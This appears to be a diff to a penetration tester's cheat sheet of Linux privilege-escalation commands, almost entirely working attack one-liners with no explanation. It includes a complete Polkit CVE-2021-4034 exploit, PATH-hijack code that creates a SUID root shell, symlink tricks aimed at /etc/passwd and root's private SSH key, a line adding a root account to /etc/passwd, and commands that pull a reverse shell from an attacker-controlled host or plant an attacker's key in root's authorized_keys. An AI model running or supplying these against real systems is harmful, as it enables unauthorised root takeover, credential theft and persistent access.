@@ -1503,12 +1503,32 @@ curl $MYIP:53/linux/agent -o /dev/shm/agent;chmod +x /dev/shm/agent;/dev/shm/age
 +---------- Creds In DB Files ----------+
 grep -IrinE "db[-_]?(user|pass|login)\w*" / 2>/dev/null
 
++---------- Symlink: Writeable Root File ----------+
+ln -sf /etc/passwd /var/log/below/error_root.log
+
 +---------- Chrome Debugging ----------+
 curl -sg http://240.0.0.1:41829/json
 echo 'Target.createTarget {"url":"file:///root/.ssh/id_rsa"}' | websocat -n1 --jsonrpc --jsonrpc-omit-jsonrpc 'ws://240.0.0.1:41829/devtools/page/0DC707C3C63E0C0E7B012B8AE0597CC0'
 curl -sg http://240.0.0.1:41829/json
 echo 'Page.printToPDF {}\n' | websocat -n1 --jsonrpc --jsonrpc-omit-jsonrpc 'ws://240.0.0.1:41829/devtools/page/BEAA157A683895274AA8D0BD21B80D0E' | jq -r '.result.data' | base64 -d > output.pdf
 sudo update-binfmts --disable cli; open output.pdf
+
++---------- PATH Hijack (SUID) ----------+
+-->> Create Imposter Binary from Victim Machine (/tmp/x)
+echo '#include<stdlib.h>\nint main(){system("cp /bin/bash /tmp/bashx;chown root:root /tmp/bashx;chmod u+s /tmp/bashx");}' | sed 's/\\n/\n/g' > /tmp/x.c; gcc /tmp/x.c -o /tmp/x; rm /tmp/x.c
+
+-->> Rename to Impose as Legit Binary
+cp /tmp/x /tmp/fdisk
+
+-->> Add Hijack Directory to PATH
+export PATH="/tmp:$PATH"
+
+-->> Execute Legit Binary: Imposter Will Execute First
+sysinfo; /tmp/bashx -p
+/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info; /tmp/bashx -p
+
+-->> Hijacked Imposter Produces SUID Bash
+/tmp/bashx -p
 
 +---------- Polkit (CVE-2021-4034) ----------+
 echo $'F=-Wall\n\nT=$(shell which true)\n\n.PHONY: all\nall: m.so run gconv-modules gconvpath\n\n.PHONY: clean\nclean:\n\trm -rf m.so run gconv-modules GCONV_PATH=./\n\ngconv-modules:\n\techo "module UTF-8// PWN// m 1" > $@\n\n.PHONY: gconvpath\ngconvpath:\n\tmkdir -p GCONV_PATH=.\n\tcp $(T) GCONV_PATH=./m.so:.\n\nm.so: m.c\n\t$(CC) $(F) --shared -fPIC -o $@ $<\n' >Makefile; echo $'#include <unistd.h>\nint main(){char * const e[]={"m.so:.","PATH=GCONV_PATH=.","SHELL=/x","CHARSET=PWN",NULL};return execve("/usr/bin/pkexec",NULL,e);}' >run.c; echo $'#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv(){}\nvoid gconv_init(void *p){char * const a[]={"/bin/sh",NULL};char * const e[]={"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",NULL};setuid(0);setgid(0);execve(a[0],a,e);exit(0);}' >m.c; make; ./run; rm gconv-modules Makefile m.c m.so run run.c; rm -rf GCONV_PATH=.
@@ -1530,12 +1550,9 @@ echo -e '#!/bin/bash\ncurl $MYIP:53/resh_5566|sh'
 echo 'bash -i'
 
 -->> curl cmd file
-echo -e 'url = "http://$MYIP:53/ssh.pub"\noutput = "/root/.ssh/authorized_keys"' > /dev/shm/cmd
-curl -s -K /dev/shm/cmd
+echo -e 'url = "http://$MYIP:53/ssh.pub"\noutput = "/root/.ssh/authorized_keys"' > /tmp/cmd
+curl -s -K /tmp/cmd
 ssh -i ~/.ssh/ssh.key root@$TARGET
-
-+---------- Symlink: Writeable Root File ----------+
-ln -sf /etc/passwd /var/log/below/error_root.log
 
 +---------- Symlink: Doubled ----------+
 ln -s /root/.ssh/id_rsa /home/bob/.cache/x; ln -s /home/bob/.cache/x /home/bob/.cache/x.png
@@ -1543,29 +1560,6 @@ CHECK_CONTENT=true sudo bash /opt/ghost/clean_symlink.sh /home/bob/.cache/x.png
 
 +---------- Write: /etc/passwd ----------+
 echo "any:$(openssl passwd -1 root):0:0:root:/root:/bin/bash" >> /etc/passwd && echo 'The password is: root'; su any
-
-+---------- PATH Hijack (suid) ----------+
--->> Create Imposter Binary
-IMPOSTER_BINARY=megacli
-echo '#include <unistd.h>\n#include <stdlib.h>\nint main() {\n  setuid(0);\n  setgid(0);\n  execl("/bin/bash", "bash", "-i", NULL);\n  return 0;\n}' > x.c
-gcc x.c -o "$IMPOSTER_BINARY"
-
--->> Create Imposter Directory for Binary
-mkdir -p ~/imposter; mv "$IMPOSTER_BINARY" ~/imposter; chmod +x ~/imposter/"$IMPOSTER_BINARY"
-
--->> Add Imposter Directory to PATH
-export PATH=~/imposter:$PATH
-
--->> Execute Legit Binary: Imposter Will Execute
-/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo megacli-disk-info
-
-strace -f -o file /usr/local/bin/suid-name
-cat file | grep -rine 'root'
-cat file | grep -rinE 'chmod |tar '
-env -i bash --norc --noprofile
-TARGET_SUID=/usr/local/bin/suid-name
-TARGET_BIN=tar
-TEMPFOLDER=$(mktemp -d); printf %s '/bin/bash -i' > $TEMPFOLDER/$TARGET_BIN; chmod +x $TEMPFOLDER/$TARGET_BIN; export PATH=$TEMPFOLDER:$PATH;$TARGET_SUID
 
 +---------- Nginx: sudo ----------+
 echo -e 'user root;\nevents{\nworker_connections 1024;\n}\nhttp{\nserver{\nlisten 9999;\nroot /;\nautoindex on;\ndav_methods PUT;\n}\n}' >/tmp/nginx.conf
